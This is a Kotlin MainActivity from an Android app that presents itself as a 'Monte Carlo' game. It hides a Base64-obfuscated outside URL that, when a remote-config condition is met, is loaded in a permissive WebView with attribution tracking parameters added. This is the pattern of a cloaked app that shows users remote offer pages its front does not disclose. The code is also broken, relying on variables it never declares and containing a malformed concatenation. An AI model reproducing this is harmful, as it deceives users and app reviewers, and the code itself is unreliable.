package com.monte.carlo

import android.content.Intent
import android.graphics.drawable.Drawable
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.View
import android.webkit.*
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.monte.carlo.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {

    fun decoderBase64(string: String): String {
        val decode = Base64.decode(string, Base64.DEFAULT)
        return String(decode)
    }
    var linkBuilderOffer = "aHR0cDovL2Q2ODQ3MGdpLmJlZ2V0LnRlY2gvTW9udGUvYXBwcy5waHA/aWQ9YXBw"
    lateinit var binding: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        FirebaseRemoteConfig.getInstance()
            .fetchAndActivate()
            .addOnCompleteListener {
                val url = FirebaseRemoteConfig.getInstance().getString("url")
                 if(url==null || (url!=null && url.equals("null"))) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        checkSource()
                    },5000)
                }
            }
        binding = ActivityMainBinding.inflate(layoutInflater)
        try {
            val ips = assets.open("back1.png")
            val drawable = Drawable.createFromStream(ips,null)
            binding.bg.setImageDrawable(drawable)
            ips.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        setContentView(binding.root)
        binding.button.setOnClickListener {
            startActivity(Intent(this@MainActivity,ActivityGame::class.java))
        }

    }

    private fun checkSource(){
        linkBuilderOffer = decoderBase64(linkBuilderOffer)
        when {

            deepLink != null -> {
                linkBuilderOffer +=  deepLink +
                loadWebView()
            }
            af_status == "Non-organic" -> {
                linkBuilderOffer += "&sub1=${sub1}&sub2=${sub2}&sub3=${sub3}&appsflyer_id=${appsflyer_id}"
                loadWebView()
            }
            af_status == "Organic" -> {
                linkBuilderOffer += "&sub1=$af_status"
                loadWebView()
            }
            (deepLink == null || af_status==null) -> {

            }
            else -> {
                linkBuilderOffer += "&sub1=$af_status"
                loadWebView()
            }
        }
    }

    private fun loadWebView(){
        createWebView()
        binding.multy.visibility = View.VISIBLE
        Log.e("onPageFinished", linkBuilderOffer.toString())
        binding.multy.loadUrl(linkBuilderOffer)
    }

    private fun createWebView(){
        binding.multy.settings.apply {
            defaultTextEncodingName = "utf-8"
            allowFileAccess = true
            javaScriptEnabled = true
            loadWithOverviewMode = true
            domStorageEnabled = true
            databaseEnabled = true
            useWideViewPort = true
            javaScriptCanOpenWindowsAutomatically = true
            mixedContentMode = 0
        }

        binding.multy.webViewClient = object : WebViewClient(){
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
            }
        }
        binding.multy.webChromeClient = object : WebChromeClient(){}
    }
}